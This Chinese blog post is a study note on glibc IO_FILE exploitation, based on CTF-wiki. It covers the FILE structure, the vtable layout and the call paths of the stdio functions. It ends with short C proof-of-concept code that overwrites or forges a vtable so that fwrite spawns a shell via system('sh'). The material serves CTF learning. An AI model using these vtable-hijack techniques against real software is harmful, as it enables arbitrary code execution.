#  初识IO_FILE Exploitation  
G0t1T
                    G0t1T  看雪学苑   2026-01-27 10:05  
  
记一次跟着ctiwiki学习IO_FILE Exploitation的过程，我会在有些地方调试看看，加深理解。大部分内容都是来自ctfwiki。  
  
  
**0****1**  
  
**给libc文件加符号表**  
  
我这里是为了链接libc2.23版本的，方便后面调试。  
  
  
下载有调试符号和没调试符号的libc  
  
```
wget https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/refs/heads/master/pwn/linux/user-mode/io-file/2018_hctf_the_end/the_endwget http://launchpadlibrarian.net/353523709/libc6-dbg_2.23-0ubuntu10_amd64.debdpkg -x libc6-dbg_2.23-0ubuntu10_amd64.deb libc6-dbg_2.23-0ubuntu10_amd64wget https://launchpadlibrarian.net/353523729/libc6_2.23-0ubuntu10_amd64.debdpkg -x libc6_2.23-0ubuntu10_amd64.deb libc6_2.23-0ubuntu10_amd64
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneR0ChIHlGLO3IeqNib0hPT0MoIcWWXjLHNuTUaMTibTBaSG0fQDdN74bFQ/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
  
这里的the_end程序其实就是后面2018 HCTF the_end题目的源程序  
  
```
patchelf --set-interpreter ./libc6_2.23-0ubuntu10_amd64/lib/x86_64-linux-gnu/ld-2.23.so ./the_endpatchelf --replace-needed libc.so.6 ./libc6_2.23-0ubuntu10_amd64/lib/x86_64-linux-gnu/libc-2.23.so ./the_end
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRTjzO4hSX4s9Pa978BlN3cGmHZLnPRA9jzYPr9v2XA6kiaiaAuEI7sWxA/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
  
查看libc文件的调试链接  
  
```
readelf -x .gnu_debuglink ./libc6_2.23-0ubuntu10_amd64/lib/x86_64-linux-gnu/libc-2.23.so
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRUI2Ty2gNAiacCCMUsUfxYaBkNoZJ4aL9ZeiaTW2BUO5rxFM2CxjT1N4w/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
  
更改链接为有调试符号的  
  
```
objcopy -R .gnu_debuglink ./libc6_2.23-0ubuntu10_amd64/lib/x86_64-linux-gnu/libc-2.23.socp libc6-dbg_2.23-0ubuntu10_amd64/usr/lib/debug/lib/x86_64-linux-gnu/libc-2.23.so ./libc6_2.23-0ubuntu10_amd64/lib/x86_64-linux-gnu/libc2.23objcopy --add-gnu-debuglink=./libc6_2.23-0ubuntu10_amd64/lib/x86_64-linux-gnu/libc2.23 ./libc6_2.23-0ubuntu10_amd64/lib/x86_64-linux-gnu/libc-2.23.so
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRtKlvyhfW5mNXUhAFc6QvuTVjpDCukBm9OaZ08krpyHqic6ULfctSkqw/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
  
修改前的效果  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRW7opbRJcafYgLjJR7WWKLAWJv0VgHNH5QIw5yDMz98aMRVNlj36tCA/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
  
修改之后的效果  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRnxD5iagpCV87ZdCy8ZKKus8mMz8dkggQBTZu25GcUM1THib3RkxDsXXQ/640?wx_fmt=png&from=appmsg "")  
![]( "")  
#   
  
**02******  
  
**FILE结构**  
  
FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中。我们常定义一个指向 FILE 结构的指针来接收这个返回值。  
  
  
FILE 结构定义在 libio.h 中，如下所示  
  
```
struct _IO_FILE {int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags/* The following pointers correspond to the C++ streambuf protocol. *//* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */char* _IO_read_ptr;   /* Current read pointer */char* _IO_read_end;   /* End of get area. */char* _IO_read_base;  /* Start of putback+get area. */char* _IO_write_base; /* Start of put area. */char* _IO_write_ptr;  /* Current put pointer. */char* _IO_write_end;  /* End of put area. */char* _IO_buf_base;   /* Start of reserve area. */char* _IO_buf_end;    /* End of reserve area. *//* The following fields are used to support backing up and undo. */char *_IO_save_base; /* Pointer to start of non-current get area. */char *_IO_backup_base;  /* Pointer to first valid character of backup area */char *_IO_save_end; /* Pointer to end of non-current get area. */struct _IO_marker *_markers;struct _IO_FILE *_chain;int _fileno;#if 0int _blksize;#elseint _flags2;#endif  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */#define __HAVE_COLUMN /* temporary *//* 1+column number of pbase(); 0 is unknown. */unsignedshort _cur_column;signedchar _vtable_offset;char _shortbuf[1];/*  char* _save_gptr;  char* _save_egptr; */  _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE};struct _IO_FILE_complete{struct _IO_FILE _file;#endif#if defined _G_IO_IO_FILE_VERSION && _G_IO_IO_FILE_VERSION == 0x20001  _IO_off64_t _offset;# if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T/* Wide character stream stuff.  */struct _IO_codecvt *_codecvt;struct _IO_wide_data *_wide_data;struct _IO_FILE *_freeres_list;void *_freeres_buf;# elsevoid *__pad1;void *__pad2;void *__pad3;void *__pad4;size_t __pad5;int _mode;/* Make sure we don't get into trouble again.  */char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];#endif};
```  
  
  
  
进程中的 FILE 结构会通过_chain 域彼此连接形成一个链表，链表头部用全局变量_IO_list_all 表示，通过这个值我们可以遍历所有的 FILE 结构。  
  
  
在标准 I/O 库中，每个程序启动时有三个文件流是自动打开的：stdin、stdout、stderr。因此在初始状态下，_IO_list_all 指向了一个有这些文件流构成的链表，但是需要注意的是这三个文件流位于 libc.so 的数据段。而我们使用 fopen 创建的文件流是分配在堆内存上的。  
  
  
我们可以在 libc.so 中找到 stdin\stdout\stderr 等符号，这些符号是指向 FILE 结构的指针，真正结构的符号是  
  
```
_IO_2_1_stderr__IO_2_1_stdout__IO_2_1_stdin_
```  
  
  
  
p _IO_list_all  
可以看到_IO_list_all是指向_IO_2_1_stderr_，而且地址位于libc.so上。注意结构体是_IO_FILE_plus，后面会说到  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRTfeI41M1icVOJEEKQVDuQhvm7jHv2r9Mzf8UIgDskXBmt97NyFgBKAA/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
  
p _IO_2_1_stderr_  
再看_IO_2_1_stderr_的结构，可以看到_chain指向了_IO_2_1_stdout_  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRKOXWhVet4gPcnNJy17icOkNA6sVTY8xqfNzqFukUETEIHJs4QsvupVQ/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
  
p _IO_2_1_stdout_  
再看_IO_2_1_stderr_的结构，可以看到_chain指向了_IO_2_1_stdin_  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneReYgLF5dype5SFbunurfOgcIiaRjONVdgwCXEMAGmZbBibIYKLGnTUVvg/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
  
p _IO_2_1_stdin_  
看_IO_2_1_stdin_的结构，可以看到_chain是指向0x0，为空。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneR2LPUlolZmaDkyDxhSibuSj13wOdXRp6u3BiarHos3KqNUick0GQ5lC81g/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
  
从这四个图可以看到链表指向是_IO_list_all -->IO_2_1_stderr  
-->IO_2_1_stdout  
-->IO_2_1_stdin  
  
  
在初始状态下，链表中只有这三个文件流。  
  
  
但是事实上_IO_FILE 结构外包裹着另一种结构_IO_FILE_plus，其中包含了一个重要的指针 vtable 指向了一系列函数指针。  
  
  
在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8  
  
```
struct _IO_FILE_plus{    _IO_FILE    file;    IO_jump_t   *vtable;}
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRkBg0xLvM2YYfHoibQhQzMvIYP3NObjfoACmGKvH0kIr7YbEF460MoGw/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
  
从上面三张图可以看到_IO_2_1_stderr_，IO_2_1_stdout  
，_IO_2_1_stdin_都是这种结构，vtable指向的地址都是一样的。  
  
  
也可以看到64位下偏移是0xd8  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRTIDgyNonH6Wicw42cggobuMibEy1v4iaqI3L6ek6El6CuKxHHdiaTHbefA/640?wx_fmt=png&from=appmsg "")  
![]( "")  
## vtable结构  
  
vtable 是 IO_jump_t 类型的指针，IO_jump_t 中保存了一些函数指针，在后面我们会看到在一系列标准 IO 函数中会调用这些函数指针.  
  
```
void * funcs[] = {1 NULL, // "extra word"2 NULL, // DUMMY3 exit, // finish4 NULL, // overflow5 NULL, // underflow6 NULL, // uflow7 NULL, // pbackfail8 NULL, // xsputn  #printf9 NULL, // xsgetn10 NULL, // seekoff11 NULL, // seekpos12 NULL, // setbuf13 NULL, // sync14 NULL, // doallocate15 NULL, // read16 NULL, // write17 NULL, // seek18 pwn,  // close19 NULL, // stat20 NULL, // showmanyc21 NULL, // imbue};
```  
  
  
  
p *(struct _IO_jump_t *)0x7ffff7dd06e0  
查看vtable的结构，以__GI_  
为前缀的符号通常是 glibc 内部用于**绑定到实际实现函数**  
的别名，其真正的函数名是去掉__GI_的。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRIamsJ5WmsNrqX4eQd6rJLLRz3GP7ic2r7pJbXa4D2Gian6eIdr2DCSWA/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
  
先下个源码wget https://ftp.gnu.org/gnu/glibc/glibc-2.23.tar.xz  
，方便后面看fread这些函数。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneR7qtURd0xmVN8Cd2IWkKhVoYm57oGqFaib3fuwGp2Vl6nS6wqbRcGxew/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
  
tar -xvf glibc-2.23.tar.xz  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRqPYQaI7FzicJVdfBNpWLBSGCPuq3lA4XyvZcQtWnGDibjRGLRtO8sO9A/640?wx_fmt=png&from=appmsg "")  
![]( "")  
## fread  
  
fread 是标准 IO 库函数，作用是从文件流中读数据，函数原型如下。  
  
```
size_tfread ( void *buffer, size_t size, size_t count, FILE *stream) ;
```  
  
  
  
fread 函数的各个参数作用如下：  
- void *buffer：这是一个指向内存中某块空间的指针，fread从文件读取的数据将会被存放于此。需要提前确保这块内存空间（如数组或变量）已经分配好，并且足够大以容纳将要读取的数据。  
  
- size_t size：这个参数指定了你要读取的每个数据元素的大小，单位是字节。例如，如果打算读取一组 int类型的数据，通常这里会使用 sizeof(int)。  
  
- size_t count：这个参数指定了你希望读取多少个上述大小为 size的数据元素。fread会尝试读取 size * count个字节的数据。  
  
- FILE *stream：这是一个指向 FILE对象的指针，它指定了数据从哪个已打开的文件流中读取。这个指针通常是由 fopen函数成功打开文件后返回的。  
  
- 返回值：fread函数返回的是成功读取的完整数据元素的个数（即 count的数值），而不是字节数。如果返回值小于 count，可能意味着发生了错误或者已经到达文件末尾（EOF）。  
  
cat glibc-2.23/libio/iofread.c  
，fread 的代码位于/libio/iofread.c 中，函数名为_IO_fread，</font>可以看到这个函数会接着调用_IO_sgetn函数。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRuug0RtxjBdHO4LVvQYEDMpDBL0m4sOucj4wPE2icZlnpOO8M3xPYL4Q/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
```
_IO_size_t_IO_fread (buf, size, count, fp)void *buf;     _IO_size_t size;     _IO_size_t count;     _IO_FILE *fp;{  ...  bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested);  ...}
```  
  
  
  
_IO_sgetn函数定义在libio/genops.c这个文件内，grep -C 3 "_IO_sgetn" glibc-2.23/libio/genops.c  
，可以看到在_IO_sgetn 函数中会直接返回_IO_XSGETN  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRicGgTDBVp0IgNIKzhcWVZvkAMFXLhLbP90s7zD1IYsCQnHCfRTBaSuA/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
```
_IO_size_t_IO_sgetn (fp, data, n)     _IO_FILE *fp;     void *data;     _IO_size_t n;{return _IO_XSGETN (fp, data, n);}
```  
  
  
  
grep -C 3 "_IO_XSGETN" glibc-2.23/libio/libioP.h  
_IO_XSGETN是一个在 glibc 的 IO 系统内部用于实现多态调用的宏，它的定义位于头文件 libio/libioP.h中，AI是这样解释的：这里的JUMP2  
是另一个宏，负责最终的函数跳转。它的作用是：**根据传入的 FILE 结构体 (****FP**  
**) 找到其对应的虚函数表 (vtable)，然后从表中取出 ****__xsgetn****函数指针并调用它**  
，同时将参数FP  
,DATA  
,N  
传递过去。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRHkkdpiar56ms4Sxm2wZ72zr4Fg5EqjKZs4k2IYUtia20liaXAESOvE0Eg/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
```
#define_IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)
```  
  
  
  
也就是说fread最后会调用vtable表中的__xsgetn函数指针，最后调用了__GI__IO_file_xsgetn。这个以__GI_  
为前缀的符号通常是 glibc 内部用于**绑定到实际实现函数**  
的别名，其真正的函数定义就是_IO_file_xsgetn。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRJIao5pl2nP3EExQaSicR3fGabSWnq3nzGrZUxTWxcRF55uQzZiac1o1Q/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
  
grep -A 60 "_IO_file_xsgetn" glibc-2.23/libio/fileops.c  
这个函数内还调用了vtable中的__underflow指针。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRay1wiaWOhwUR6u7WiaDqqFxMLoH6V9HeHzSoFMqowLNjovbqnO3EUh2w/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
  
类似地最终会调用系统接口 read 函数  
  
fread --> _IO_sgetn --> _IO_XSGETN  --> __xsgetn --> __IO_file_xsgetn --> __underflow --> _IO_new_file_underflow --> _IO_SYSREAD  
## fwrite  
  
fwrite 同样是标准 IO 库函数，作用是向文件流写入数据，函数原型如下。  
  
```
size_tfwrite(constvoid* buffer, size_t size, size_t count, FILE* stream);
```  
  
  
  
fwrite 函数的各个参数作用如下：  
- const void* buffer：这是指向内存中一块空间的指针，该空间存放着你准备写入文件的数据。  
  
- size_t size：这个参数指定了每个要写入的数据项的字节大小。例如，如果你要写入一个整数数组，这里通常使用 sizeof(int)。  
  
- size_t count：这个参数指明你希望写入多少个上述大小的数据项。例如，如果你的 buffer指向一个包含10个整数的数组，并且 size是 sizeof(int)，那么这里就应设置为10，表示要写入10个整数 。  
  
- FILE* stream：这是一个指向 FILE对象的指针，它指定了数据要写入到哪个已打开的文件流。这个指针通常是由 fopen函数成功打开文件后返回的。  
  
- 返回值：函数返回成功写入到文件中的数据项数量（是 count的个数，而非总字节数）。  
  
cat glibc-2.23/libio/iofwrite.c</font>  
<font style="color:rgba(0, 0, 0, 0.87);">fwrite 的代码位于/libio/iofwrite.c 中，函数名为_IO_fwrite，可以看到这个函数会接着调用_IO_sputn函数。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRVUxScdT5okJxDtlxtlFibrxuoatvg42DFXVjkDo3DGs5GM6wFIMZHfg/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
```
written = _IO_sputn (fp, (const char *) buf, request);
```  
  
  
  
grep "_IO_sputn" glibc-2.23/libio/libioP.h  
，而_IO_sputn是一个宏，它的定义位于 glibc 源码的 libio/libioP.h 头文件中，AI解释如下：这个宏的核心作用是作为**函数调用的路由**  
，它会根据传入的FILE  
结构体找到对应的虚函数表（vtable），并调用其中的__xsputn  
函数指针 。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRICFAmeadyozR6iaoMcL1vSGoM2rywdTV0VZKTIHV0zUObM2ibOZWNIRA/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
  
grep -C 3 "_IO_XSPUTN" glibc-2.35/libio/libioP.h  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneR7rQg1ia9RppGicE4dAnWOAib2HQF7d9tEzoDcvWU10e8blfdejXQM037Q/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRfmdGBFaxS84iaJTKX0ctDaxHwsOJXD7se76M3dicIPTXN9AdjY2CBr0g/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
  
grep -C 90 "_IO_new_file_xsputn" glibc-2.23/libio/fileops.c  
在_IO_new_file_xsputn函数内还可以发现调用了_IO_OVERFLOW函数。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRhzWVFq4Rm0qZtpBVM9BtdCrydIABcibMA6vT5AnicyLosqdR1FzgU1kg/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
```
/* Next flush the (full) buffer. */if (_IO_OVERFLOW (f, EOF) == EOF)
```  
  
  
  
grep -C 3 "_IO_OVERFLOW" glibc-2.35/libio/libioP.h  
会跳转到__overflow指针  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRqlUE3qKpmTrv2qd6dL8lULAEYCr8vnwY7qOvLibQT6ia89TlXMABuUibQ/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
  
根据上文得到的结果，会调用_IO_new_file_overflow函数  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneR6abRZhM7hnVwC4vu5lLW13yT8u7dYkUYhicM8gF3AlMO3tiaWHDHpmEA/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
  
grep -C 30 "_IO_new_file_overflow" glibc-2.35/libio/fileops.c  
调用了_IO_do_write  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneR7vcJljibNU4I82iaDqYkIglrapgTV2X0v8QdcHJsTxaNOepibcSzFZkIg/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
  
类似地最终会调用系统接口 write 函数  
  
fwrite --> _IO_sputn -->   
_IO_XSPUTN --> __xsputn --> _IO_new_file_xsputn --> _IO_OVERFLOW --> __overflow --> _IO_new_file_overflow --> _IO_do_write --> _IO_new_do_write --> new_do_write --> _IO_SYSWRITE  
## fopen  
  
fopen 在标准 IO 库中用于打开文件，函数原型如下  
  
```
FILE *fopen(char *filename, *type);
```  
  
- filename: 目标文件的路径  
  
- type: 打开方式的类型，可以有r,w,a,r+,w+,a+等等  
  
- 返回值: 返回一个文件指针  
  
在 fopen 内部会创建 FILE 结构并进行一些初始化操作，下面来看一下这个过程  
  
  
cat glibc-2.23/libio/iofopen.c  
，这个函数在libio/iofopen.c文件内，函数名为_IO_new_fopen，该函数直接调用__fopen_internal  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRZqTanbBYDxJhTCzoj299dgzial5Zbqibz9VaicXqhIqNCOpUkAiaDHLzbw/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
  
首先在 fopen 对应的函数__fopen_internal 内部会调用 malloc 函数，分配 FILE 结构的空间。因此我们可以获知 FILE 结构是存储在堆上的。  
  
```
*new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));
```  
  
  
  
之后会为创建的 FILE 初始化 vtable，并调用_IO_file_init 进一步初始化操作。  
  
```
_IO_JUMPS (&new_f->fp) = &_IO_file_jumps;_IO_file_init (&new_f->fp);
```  
  
  
  
在_IO_file_init 函数的初始化操作中，会调用_IO_link_in 把新分配的 FILE 链入_IO_list_all 为起始的 FILE 链表中。  
  
  
grep -A 60 "_IO_new_file_init" glibc-2.23/libio/fileops.c  
这里用了另一个函数名表示初始化函数。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRh7QRKEjV2jD30bcwJpPGJOPJpVLfp2Kk326p5vb0HqMpErOJsZibBXw/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRSWaP4eCDOoQM2uG6o5WxBUfTJ35fr4SWeCP8iab9ibplBibc9aA5HkQEA/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
  
grep -A 60 "_IO_link_in" glibc-2.23/libio/genops.c  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRutric0BHGjCdMCw4TBZhgxDCSaJfj6VqiaF8BkkLxRFmUzQrorIk5m7g/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
  
<之后__fopen_internal 函数会调用_IO_file_fopen 函数打开目标文件，_IO_file_fopen 会根据用户传入的打开模式进行打开操作，总之最后会调用到系统接口 open 函数，这里不再深入。  
  
```
if (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != NULL)return __fopen_maybe_mmap (&new_f->fp.file);
```  
  
  
  
总结一下 fopen 的操作是  
- 使用 malloc 分配 FILE 结构  
  
- 设置 FILE 结构的 vtable  
  
- 初始化分配的 FILE 结构  
  
- 将初始化的 FILE 结构链入 FILE 结构链表中  
  
- 调用系统调用打开文件  
  
fopen --> _IO_new_fopen --> __fopen_internal --> _IO_file_fopen --> .....  
## fclose  
  
fclose 是标准 IO 库中用于关闭已打开文件的函数，其作用与 fopen 相反。  
  
```
intfclose(FILE *stream)
```  
  
  
  
功能：关闭一个文件流，使用 fclose 就可以把缓冲区内最后剩余的数据输出到磁盘文件中，并释放文件指针和有关的缓冲区  
  
  
cat glibc-2.23/libio/iofclose.c  
<font style="color:rgba(0, 0, 0, 0.87);">fclose在</font>libio/iofclose.c文件中的函数名是_IO_new_fclose  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRE1o0OqXMBNg00uhIicsgE5K4zF6YefOmb9DS9GdfXU1HssorElNUialQ/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
  
fclose 首先会调用_IO_unlink_it 将指定的 FILE 从_chain 链表中脱链  
  
```
if (fp->_IO_file_flags & _IO_IS_FILEBUF)    _IO_un_link ((struct _IO_FILE_plus *) fp);
```  
  
  
  
之后会调用_IO_file_close_it 函数，_IO_file_close_it 会调用系统接口 close 关闭文件  
  
```
if (fp->_IO_file_flags & _IO_IS_FILEBUF)status = _IO_file_close_it (fp);
```  
  
  
  
最后调用 vtable 中的_IO_FINISH，其对应的是_IO_file_finish 函数，其中会调用 free 函数释放之前分配的 FILE 结构  
  
```
_IO_FINISH (fp);
```  
  
## printf/puts  
  
printf 和 puts 是常用的输出函数，在 printf 的参数是以'\n'结束的纯字符串时，printf 会被优化为 puts 函数并去除换行符。  
  
  
puts 在源码中实现的函数是_IO_puts，这个函数的操作与 fwrite 的流程大致相同，函数内部同样会调用 vtable 中的_IO_sputn，结果会执行_IO_new_file_xsputn，最后会调用到系统接口 write 函数。  
  
  
printf 的调用栈回溯如下，同样是通过_IO_file_xsputn 实现  
  
```
vfprintf+11_IO_file_xsputn_IO_file_overflowfunlockfile_IO_file_writewrite
```  
  
#   
  
**03******  
  
**伪造 vtable 劫持程序流程**  
  
前面我们介绍了 Linux 中文件流的特性（FILE），我们可以得知 Linux 中的一些常见的 IO 操作函数都需要经过 FILE 结构进行处理。尤其是_IO_FILE_plus 结构中存在 vtable，一些函数会取出 vtable 中的指针进行调用。  
  
  
因此伪造 vtable 劫持程序流程的中心思想就是针对_IO_FILE_plus 的 vtable 动手脚，通过把 vtable 指向我们控制的内存，并在其中布置函数指针来实现。  
  
  
因此 vtable 劫持分为两种,一种是直接改写 vtable 中的函数指针，通过任意地址写就可以实现。另一种是覆盖 vtable 的指针指向我们控制的内存，然后在其中布置函数指针。  
## 实践  
  
这里演示了修改 vtable 中的指针，首先需要知道_IO_FILE_plus 位于哪里，对于 fopen 的情况下是位于堆内存，对于 stdin\stdout\stderr 是位于 libc.so 中。  
  
```
intmain(void){    FILE *fp;longlong *vtable_ptr;    fp=fopen("123.txt","rw");    vtable_ptr=*(longlong*)((longlong)fp+0xd8);     //get vtable    vtable_ptr[7]=0x41414141; //xsputnprintf("call 0x41414141");}
```  
  
  
  
根据 vtable 在_IO_FILE_plus 的偏移得到 vtable 的地址，在 64 位系统下偏移是 0xd8。之后需要搞清楚欲劫持的 IO 函数会调用 vtable 中的哪个函数。 printf 会调用 vtable 中的 xsputn，并且 xsputn 的是 vtable 中第八项之后就可以写入这个指针进行劫持。  
  
  
并且在 xsputn 等 vtable 函数进行调用时，传入的第一个参数其实是对应的_IO_FILE_plus 地址。比如这例子调用 printf，传递给 vtable 的第一个参数就是_IO_2_1_stdout_的地址。  
  
  
类似这种，第一个参数都是fp，fp实际上就是_IO_FILE_plus的地址。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneR7UsGvzkjKEeawnUDrV2jRyqXibiaTKcUYR2jm1JicY3yxO0OgOZDOHlQg/640?wx_fmt=other&from=appmsg "")  
![]( "")  
  
  
利用这点可以实现给劫持的 vtable 函数传參，比如以下这个代码，memcopy(fp,"sh",3);就是把file结构前三个字节改成了sh\0，然后劫持xsputn就可以实现system(sh)了。  
  
```
#define system_ptr 0x7ffff7a52390;intmain(void){    FILE *fp;longlong *vtable_ptr;    fp=fopen("123.txt","rw");    vtable_ptr=*(longlong*)((longlong)fp+0xd8);     //get vtablememcopy(fp,"sh",3);    vtable_ptr[7]=system_ptr; //xsputnfwrite("hi",2,1,fp);}
```  
  
  
  
但是在目前 libc2.23 版本下，位于 libc 数据段的 vtable 是不可以进行写入的。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRmaiahZxWfpGeBceWIhBhibK5ibp1ZOqkp3cClawvft4WLhtRpOiafkX1FQ/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
  
不过，通过在可控的内存中伪造 vtable 的方法依然可以实现利用。  
  
```
#define system_ptr 0x7ffff7a52390;intmain(void){    FILE *fp;longlong *vtable_addr,*fake_vtable;    fp=fopen("123.txt","rw");    fake_vtable=malloc(0x40);    vtable_addr=(longlong *)((longlong)fp+0xd8);     //vtable offset    vtable_addr[0]=(longlong)fake_vtable;memcpy(fp,"sh",3);    fake_vtable[7]=system_ptr; //xsputnfwrite("hi",2,1,fp);}
```  
  
  
  
我们首先分配一款内存来存放伪造的 vtable，之后修改_IO_FILE_plus 的 vtable 指针指向这块内存。因为 vtable 中的指针我们放置的是 system 函数的地址，因此需要传递参数 "/bin/sh" 或 "sh"。  
  
  
因为 vtable 中的函数调用时会把对应的_IO_FILE_plus 指针作为第一个参数传递，因此这里我们把 "sh" 写入_IO_FILE_plus 头部。之后对 fwrite 的调用就会经过我们伪造的 vtable 执行 system("sh")。  
  
  
同样，如果程序中不存在 fopen 等函数创建的_IO_FILE 时，也可以选择 stdin\stdout\stderr 等位于 libc.so 中的_IO_FILE，这些流在 printf\scanf 等函数中就会被使用到。在 libc2.23 之前，这些 vtable 是可以写入并且不存在其他检测的。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRErHsP7tl2ZGLQDyn5JP6a5LicwRP1aFia6YJf7ibMJkabLFraYNht6CxA/640?wx_fmt=png&from=appmsg "")  
![]( "")  
## 2018 HCTF the_end  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRgiaLy537DkRS0lf7qaTGuNnBVxZttVBQpCQy5wA3odEPwRDEO4icLRVQ/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
```
